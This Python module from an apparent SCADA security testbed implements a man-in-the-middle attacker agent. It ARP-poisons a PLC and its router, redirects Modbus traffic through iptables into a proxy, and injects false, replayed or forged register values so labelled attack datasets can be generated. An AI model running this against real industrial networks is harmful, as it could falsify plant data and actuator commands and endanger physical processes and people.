"""In-path MITM attacker agent (runs inside an isolated attacker container).

It ARP-poisons the victim PLC and its field-LAN router, REDIRECTs the
intercepted Modbus connection into a transparent proxy, and applies an attack
handler while the attack window is open. The window is opened and closed by the
experiment runner, which writes a small JSON control file into the shared
``/logs`` volume; the agent polls it. All attacker actions are appended to a CSV
so they can be aligned with the dataset labels.

    python -m scadavt.attacks.mitm --victim-ip 10.10.6.11 --gw-ip 10.10.6.254 \
        --func 4 --address 24 --mode freeze --value 0 \
        --control /logs/attacks/a1.json --log /logs/attacks/a1.csv

The agent never routes off the field segment: it is attached to one network
only and performs no action against any address outside the two it is given.
"""

from __future__ import annotations

import argparse
import csv
import json
import signal
import subprocess
import threading
import time
from pathlib import Path

from . import arp
from .handlers import CommandHandler, FDIHandler, ReplayHandler
from .proxy import TransparentProxy


def build_handler(a):
    if a.kind == "fdi":
        return FDIHandler(func=a.func, address=a.address, mode=a.mode, value=a.value)
    if a.kind == "replay":
        return ReplayHandler(func=a.func, address=a.address, window=a.window)
    if a.kind == "command":
        return CommandHandler(reg_type=a.reg_type, address=a.address, mode=a.mode, value=a.value)
    raise ValueError(f"unknown attack kind {a.kind!r}")


class Agent:
    def __init__(self, a):
        self.a = a
        self.iface = a.iface or arp.default_iface()
        self.handler = build_handler(a)
        self.proxy = TransparentProxy("0.0.0.0", a.proxy_port, self.handler, log=self._noop)
        self.spoofer: arp.ARPSpoofer | None = None
        self.active = False
        self._mitm_up = False
        self._arp_stop = threading.Event()
        self._arp_thread: threading.Thread | None = None
        self._stop = False
        self.logf = Path(a.log)
        self.logf.parent.mkdir(parents=True, exist_ok=True)
        self._log_init()

    def _noop(self, *a):
        pass

    # ----------------------------------------------------------------- iptables
    def _redirect(self, add: bool):
        op = "-A" if add else "-D"
        subprocess.run(["iptables", "-t", "nat", op, "PREROUTING", "-p", "tcp",
                        "-d", self.a.victim_ip, "--dport", str(self.a.modbus_port),
                        "-j", "REDIRECT", "--to-ports", str(self.a.proxy_port)],
                       check=False)

    # -------------------------------------------------------------------- arp
    def _arp_loop(self):
        while not self._arp_stop.is_set():
            if self.spoofer:
                self.spoofer.poison_once()
            self._arp_stop.wait(1.0)

    # ----------------------------------------------- persistent MITM path
    # The man-in-the-middle position (ARP poisoning + REDIRECT) is established
    # once and held for the whole run; it only relays traffic. The *attack*
    # window toggles the rewrite handler, so out-of-window traffic is the true
    # plant data with no path churn and clean recovery.
    def setup_mitm(self) -> bool:
        self.spoofer = arp.ARPSpoofer(self.iface, self.a.victim_ip, self.a.gw_ip)
        for _ in range(10):
            if self.spoofer.learn():
                break
            time.sleep(1.0)
        if not (self.spoofer.a_mac and self.spoofer.b_mac):
            self._log("error", note="could not resolve victim/router MAC")
            return False
        self._redirect(add=True)
        self._arp_stop.clear()
        self._arp_thread = threading.Thread(target=self._arp_loop, daemon=True)
        self._arp_thread.start()
        self._mitm_up = True
        self._log("mitm_up")
        return True

    def teardown_mitm(self):
        if not getattr(self, "_mitm_up", False):
            return
        self._arp_stop.set()
        if self._arp_thread:
            self._arp_thread.join(timeout=2)
        if self.spoofer:
            self.spoofer.restore()
        self._redirect(add=False)
        self._mitm_up = False

    def enable(self):
        if self.active:
            return
        self.handler.reset()
        self.handler.enabled = True
        self.active = True
        self._log("start")

    def disable(self):
        if not self.active:
            return
        self.handler.enabled = False
        self.active = False
        self._log("stop")

    # ------------------------------------------------------------------- log
    def _log_init(self):
        if not self.logf.exists():
            with open(self.logf, "w", newline="") as fh:
                csv.writer(fh).writerow(["wall_time", "event", "kind", "victim",
                                         "address", "mode", "value", "hits", "note"])

    def _log(self, event, note=""):
        with open(self.logf, "a", newline="") as fh:
            csv.writer(fh).writerow([round(time.time(), 3), event, self.a.kind,
                                     self.a.victim_ip, self.a.address,
                                     getattr(self.a, "mode", ""), getattr(self.a, "value", ""),
                                     self.handler.hits, note])

    # ------------------------------------------------------------------ main
    def run(self):
        threading.Thread(target=self.proxy.serve_forever, daemon=True).start()
        control = Path(self.a.control)
        self._log("ready")
        self.setup_mitm()
        while not self._stop:
            want = False
            try:
                if control.exists():
                    want = bool(json.loads(control.read_text() or "{}").get("active"))
            except Exception:
                want = False
            if want and not self.active:
                self.enable()
            elif not want and self.active:
                self.disable()
            time.sleep(0.2)
        self.disable()
        self.teardown_mitm()
        self.proxy.stop()

    def shutdown(self, *_):
        self._stop = True


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--kind", default="fdi", choices=["fdi", "replay", "command"])
    ap.add_argument("--victim-ip", required=True)
    ap.add_argument("--gw-ip", required=True)
    ap.add_argument("--func", type=int, default=4, choices=[3, 4],
                    help="read function code for fdi/replay")
    ap.add_argument("--reg-type", default="H", choices=["C", "H"],
                    help="actuator register type for command (C coil, H holding)")
    ap.add_argument("--address", type=int, required=True)
    ap.add_argument("--mode", default="freeze", choices=["const", "offset", "freeze"])
    ap.add_argument("--value", type=float, default=0.0)
    ap.add_argument("--window", type=int, default=240, help="replay buffer length")
    ap.add_argument("--modbus-port", type=int, default=502)
    ap.add_argument("--proxy-port", type=int, default=7502)
    ap.add_argument("--iface", default="")
    ap.add_argument("--control", required=True)
    ap.add_argument("--log", required=True)
    a = ap.parse_args(argv)

    agent = Agent(a)
    signal.signal(signal.SIGTERM, agent.shutdown)
    signal.signal(signal.SIGINT, agent.shutdown)
    agent.run()


if __name__ == "__main__":
    main()
